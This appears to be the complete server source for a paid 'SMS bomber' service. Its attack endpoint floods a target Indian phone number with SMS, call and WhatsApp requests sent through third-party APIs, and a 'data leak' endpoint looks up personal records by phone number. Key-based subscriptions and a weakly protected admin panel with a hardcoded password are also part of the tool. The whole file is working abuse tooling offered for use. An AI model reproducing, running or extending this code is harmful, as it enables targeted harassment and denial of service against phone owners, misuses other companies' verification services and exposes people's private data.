const express = require('express');
const cors = require('cors');
const axios = require('axios');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const requestIp = require('request-ip');
const useragent = require('useragent');
const geoip = require('geoip-lite');
const crypto = require('crypto');
const moment = require('moment');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = 5500;
const ADMIN_PASSWORD = "shaiqua@74567";

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(requestIp.mw());

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));
app.use('/admin', express.static(path.join(__dirname, 'admin')));

// Create directories if not exist
if (!fs.existsSync('./public')) fs.mkdirSync('./public');
if (!fs.existsSync('./admin')) fs.mkdirSync('./admin');

// Load APIs
let apisData = { apis: [] };
try {
  if (fs.existsSync('./apis.json')) {
    const apisContent = fs.readFileSync('./apis.json', 'utf8');
    apisData = JSON.parse(apisContent);
    console.log(`✅ Loaded ${apisData.apis.length} APIs`);
  } else {
    console.log('❌ apis.json not found');
  }
} catch (error) {
  console.log('❌ Error loading APIs:', error.message);
}

// Database
let database = {
  users: [],
  keys: [],
  attacks: [],
  locations: [],
  logs: []
};

try {
  if (fs.existsSync('./database.json')) {
    database = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
  } else {
    fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
  }
  console.log(`✅ Loaded ${database.users.length} users, ${database.keys.length} keys`);
} catch (error) {
  console.log('❌ Error loading database');
}

// Save database
function saveDatabase() {
  fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
}

// Add log
function addLog(type, message, data = {}) {
  const log = {
    id: crypto.randomBytes(8).toString('hex'),
    type,
    message,
    data,
    timestamp: new Date().toISOString()
  };
  database.logs.push(log);
  if (database.logs.length > 1000) database.logs = database.logs.slice(-1000);
  saveDatabase();
  io.emit('new-log', log);
  return log;
}

// =============== KEY GENERATION FUNCTIONS ===============

// Generate unique key
function generateKey(plan = 'basic', duration = 30) {
  const prefix = plan === 'premium' ? 'PRM' : plan === 'vip' ? 'VIP' : 'BAS';
  const random = crypto.randomBytes(12).toString('hex').toUpperCase();
  const key = `${prefix}-${random.substring(0, 4)}-${random.substring(4, 8)}-${random.substring(8, 12)}-${random.substring(12, 16)}`;
  
  const keyData = {
    key: key,
    plan: plan,
    duration: duration,
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + duration * 24 * 60 * 60 * 1000).toISOString(),
    used: false,
    usedBy: null,
    usedAt: null
  };
  
  database.keys.push(keyData);
  saveDatabase();
  addLog('key', `Generated ${plan} key: ${key}`, { plan, duration });
  
  return keyData;
}

// Validate key
function validateKey(key) {
  const keyData = database.keys.find(k => k.key === key);
  
  if (!keyData) {
    return { valid: false, message: 'Invalid key' };
  }
  
  if (keyData.used) {
    return { valid: false, message: 'Key already used' };
  }
  
  if (new Date() > new Date(keyData.expiresAt)) {
    return { valid: false, message: 'Key expired' };
  }
  
  return { valid: true, keyData };
}

// Use key
function useKey(key, userId) {
  const keyData = database.keys.find(k => k.key === key);
  if (!keyData) return false;
  
  keyData.used = true;
  keyData.usedBy = userId;
  keyData.usedAt = new Date().toISOString();
  saveDatabase();
  
  return keyData;
}

// =============== API CALL FUNCTION ===============

async function callApi(api, phone) {
  try {
    let url = api.url;
    let data = null;
    
    // Replace {phone} in URL
    url = url.replace(/{phone}/g, phone);
    
    // Prepare data
    if (api.body) {
      if (typeof api.body === 'string') {
        data = api.body.replace(/{phone}/g, phone);
      } else {
        data = {};
        for (let key in api.body) {
          let value = api.body[key];
          if (typeof value === 'string') {
            value = value.replace(/{phone}/g, phone);
          } else if (typeof value === 'object') {
            value = JSON.parse(JSON.stringify(value).replace(/{phone}/g, phone));
          }
          data[key] = value;
        }
      }
    }

    const response = await axios({
      method: api.method,
      url: url,
      headers: api.headers || {},
      data: data,
      timeout: 5000
    });

    return { success: true, status: response.status };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

// =============== DATA LEAK API FUNCTIONS ===============

async function fetchDataLeak(api, phone) {
  try {
    let url = api.url.replace(/{phone}/g, phone);
    
    const response = await axios({
      method: api.method,
      url: url,
      headers: api.headers || {},
      timeout: 8000
    });

    return { success: true, data: response.data };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

// =============== API ENDPOINTS ===============

// Validate key
app.post('/api/validate-key', (req, res) => {
  const { key, userId } = req.body;
  
  const validation = validateKey(key);
  
  if (validation.valid) {
    // Use the key
    useKey(key, userId);
    
    // Create or update user
    let user = database.users.find(u => u.id === userId);
    if (!user) {
      user = {
        id: userId,
        key: key,
        plan: validation.keyData.plan,
        activatedAt: new Date().toISOString(),
        expiresAt: validation.keyData.expiresAt,
        attacksDone: 0
      };
      database.users.push(user);
    } else {
      user.key = key;
      user.plan = validation.keyData.plan;
      user.activatedAt = new Date().toISOString();
      user.expiresAt = validation.keyData.expiresAt;
    }
    saveDatabase();
    
    res.json({ 
      success: true, 
      message: 'Key validated successfully',
      user: {
        plan: validation.keyData.plan,
        expiresAt: validation.keyData.expiresAt
      }
    });
  } else {
    res.json({ success: false, message: validation.message });
  }
});

// Check user status
app.post('/api/user-status', (req, res) => {
  const { userId } = req.body;
  
  const user = database.users.find(u => u.id === userId);
  
  if (!user) {
    return res.json({ 
      active: false,
      message: 'No active subscription'
    });
  }
  
  if (new Date() > new Date(user.expiresAt)) {
    return res.json({ 
      active: false,
      message: 'Subscription expired'
    });
  }
  
  res.json({
    active: true,
    plan: user.plan,
    expiresAt: user.expiresAt,
    attacksDone: user.attacksDone
  });
});

// Get all APIs
app.get('/api/apis', (req, res) => {
  res.json({
    total: apisData.apis.length,
    apis: apisData.apis
  });
});

// Start attack
app.post('/api/attack', async (req, res) => {
  const { phone, duration, speed, userId } = req.body;
  
  // Verify user
  const user = database.users.find(u => u.id === userId);
  if (!user || new Date() > new Date(user.expiresAt)) {
    return res.json({ success: false, message: 'Invalid or expired subscription' });
  }
  
  console.log(`⚡ Attack started: ${phone} for ${duration}s by user ${userId}`);
  addLog('attack', `Attack started on +91${phone}`, { phone, duration, speed, userId });
  
  // Set headers for SSE
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  const startTime = Date.now();
  const endTime = startTime + (duration * 1000);
  
  let totalRequests = 0;
  let successRequests = 0;
  let failedRequests = 0;
  
  // Filter SMS and Call APIs only
  const smsApis = apisData.apis.filter(api => api.type === 'SMS' || api.type === 'Call' || api.type === 'WhatsApp');
  const batchSize = speed === 5 ? smsApis.length : Math.floor(smsApis.length * (speed / 5));
  
  const attackInterval = setInterval(async () => {
    const now = Date.now();
    
    if (now >= endTime) {
      clearInterval(attackInterval);
      
      user.attacksDone = (user.attacksDone || 0) + 1;
      saveDatabase();
      
      addLog('attack', `Attack completed on +91${phone}`, { totalRequests, successRequests, failedRequests });
      
      res.write(`data: ${JSON.stringify({ 
        type: 'end', 
        total: totalRequests, 
        success: successRequests, 
        failed: failedRequests 
      })}\n\n`);
      res.end();
      return;
    }

    const promises = [];
    
    for (let i = 0; i < batchSize; i++) {
      const api = smsApis[i % smsApis.length];
      for (let j = 0; j < (api.count || 1); j++) {
        promises.push(callApi(api, phone));
      }
    }

    const results = await Promise.allSettled(promises);
    
    results.forEach(result => {
      totalRequests++;
      if (result.status === 'fulfilled' && result.value.success) {
        successRequests++;
      } else {
        failedRequests++;
      }
    });

    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const progress = (elapsed / duration) * 100;
    const rps = totalRequests / elapsed || 0;

    res.write(`data: ${JSON.stringify({
      type: 'update',
      elapsed,
      total: totalRequests,
      success: successRequests,
      failed: failedRequests,
      progress,
      rps: rps.toFixed(1)
    })}\n\n`);

  }, 1000);
});

// Data leak search
app.post('/api/data-leak', async (req, res) => {
  const { phone, userId } = req.body;
  
  // Verify user
  const user = database.users.find(u => u.id === userId);
  if (!user || new Date() > new Date(user.expiresAt)) {
    return res.json({ success: false, message: 'Invalid or expired subscription' });
  }
  
  // Filter data leak APIs
  const dataApis = apisData.apis.filter(api => api.type === 'Data');
  
  const results = [];
  
  for (const api of dataApis) {
    const result = await fetchDataLeak(api, phone);
    results.push({
      name: api.name,
      ...result
    });
  }
  
  addLog('data', `Data leak search for +91${phone}`, { results: results.length });
  
  res.json({
    success: true,
    results: results
  });
});

// =============== ADMIN ENDPOINTS ===============

// Admin login
app.post('/admin/api/login', (req, res) => {
  const { password } = req.body;
  
  if (password === ADMIN_PASSWORD) {
    const token = crypto.randomBytes(32).toString('hex');
    res.json({ success: true, token });
  } else {
    res.json({ success: false });
  }
});

// Generate key (admin only)
app.post('/admin/api/generate-key', (req, res) => {
  const { plan, duration, adminToken } = req.body;
  
  // Simple token check
  if (!adminToken) {
    return res.json({ success: false, message: 'Unauthorized' });
  }
  
  const key = generateKey(plan, duration);
  
  res.json({
    success: true,
    key: key.key,
    plan: key.plan,
    expiresAt: key.expiresAt
  });
});

// Get all keys (admin only)
app.post('/admin/api/keys', (req, res) => {
  const { adminToken } = req.body;
  
  if (!adminToken) {
    return res.json({ success: false, message: 'Unauthorized' });
  }
  
  res.json({
    success: true,
    keys: database.keys
  });
});

// Get stats (admin only)
app.post('/admin/api/stats', (req, res) => {
  const { adminToken } = req.body;
  
  if (!adminToken) {
    return res.json({ success: false, message: 'Unauthorized' });
  }
  
  const activeUsers = database.users.filter(u => new Date() <= new Date(u.expiresAt)).length;
  const totalAttacks = database.attacks.length;
  const totalKeys = database.keys.length;
  const usedKeys = database.keys.filter(k => k.used).length;
  
  res.json({
    success: true,
    stats: {
      totalUsers: database.users.length,
      activeUsers,
      totalAttacks,
      totalKeys,
      usedKeys,
      availableKeys: totalKeys - usedKeys,
      totalLocations: database.locations.length
    }
  });
});

// =============== SOCKET.IO ===============
io.on('connection', (socket) => {
  console.log('🔌 Client connected:', socket.id);
  
  socket.on('disconnect', () => {
    console.log('🔌 Client disconnected:', socket.id);
  });
});

// Serve main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin', 'admin-panel.html'));
});

// Start server
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════════════════╗
║              ⚡ SHAIQUA PRIMIUM ADVANCED EDITION ⚡                ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  📡 Server URL: http://localhost:${PORT}                             ║
║  📊 Total APIs: ${apisData.apis.length}                                         ║
║  🔑 Key System: ✅ ACTIVE                                         ║
║  👥 Total Users: ${database.users.length}                                        ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🔑 Admin Panel: http://localhost:${PORT}/admin                      ║
║  🔐 Admin Password: ${ADMIN_PASSWORD}                                   ║
║  📞 Support: @introvert_O2z                                       ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
  `);
});